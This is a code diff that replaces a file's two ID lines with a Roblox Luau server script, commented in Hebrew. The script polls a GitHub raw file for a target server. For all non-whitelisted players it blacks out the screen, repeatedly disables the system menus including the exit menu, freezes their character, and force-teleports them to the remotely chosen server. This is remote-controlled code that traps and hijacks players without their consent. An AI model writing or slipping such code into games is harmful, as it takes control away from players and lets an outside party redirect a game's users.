@@ -1,2 +1,76 @@
-109983668079237
-43d0786f-3952-4f93-ae5d-a7a6b8e6141a
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
+
+-- חזרנו לראוי הקבוע שלך
+local rawUrl = "https://raw.githubusercontent.com/dylanzyl120/dylanzyl120/refs/heads/main/main"
+local whitelisted = {["noamdb15"] = true, ["dylanzyl123"] = true}
+
+-- פונקציה שחוסמת את התפריטים ויוצרת את המסך השחור
+local function applyMaximumLock(player)
+	local sg = Instance.new("ScreenGui")
+	sg.Name = "TotalBlackout"
+	sg.IgnoreGuiInset = true -- מכסה את כל המסך כולל כפתור ה-Esc
+	sg.DisplayOrder = 9999999
+	sg.Parent = player:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame", sg)
+	frame.Size = UDim2.new(1, 0, 1, 0)
+	frame.BackgroundColor3 = Color3.new(0, 0, 0)
+	frame.Active = true -- חוסם לחיצות עכבר
+
+	-- מנטרל את כפתורי המערכת של רובלוקס
+	local code = [[
+		local starterGui = game:GetService("StarterGui")
+		task.spawn(function()
+			while true do
+				pcall(function()
+					starterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+				end)
+				task.wait(1)
+			end
+		end)
+	]]
+	local ls = Instance.new("LocalScript", sg)
+	ls.Source = code
+end
+
+task.spawn(function()
+	while true do
+		local success, response = pcall(function()
+			-- מוסיף nocache כדי למנוע מהשרת לקרוא מידע ישן מה-GitHub
+			return HttpService:GetAsync(rawUrl .. "?nocache=" .. tick())
+		end)
+
+		if success and response then
+			local lines = {}
+			for line in response:gmatch("[^\r\n]+") do table.insert(lines, line) end
+			
+			local targetPlaceId = tonumber(lines[1])
+			local targetJobId = lines[2]
+
+			-- בודק אם ה-JobId מהקובץ שונה מהשרת הנוכחי
+			if targetJobId and targetJobId ~= "" and targetJobId ~= game.JobId then
+				for _, p in pairs(Players:GetPlayers()) do
+					if not whitelisted[p.Name] then
+						-- 1. חוסם לו את המסך
+						pcall(function() applyMaximumLock(p) end)
+
+						-- 2. מקפיא אותו במקום
+						if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+							p.Character.HumanoidRootPart.Anchored = true
+						end
+
+						-- 3. משגר אותו לשרת המטרה
+						task.spawn(function()
+							pcall(function()
+								TeleportService:TeleportToPlaceInstance(targetPlaceId, targetJobId, p)
+							end)
+						end)
+					end
+				end
+			end
+		end
+		task.wait(0.5) -- בודק עדכונים כל חצי שנייה
+	end
+end)
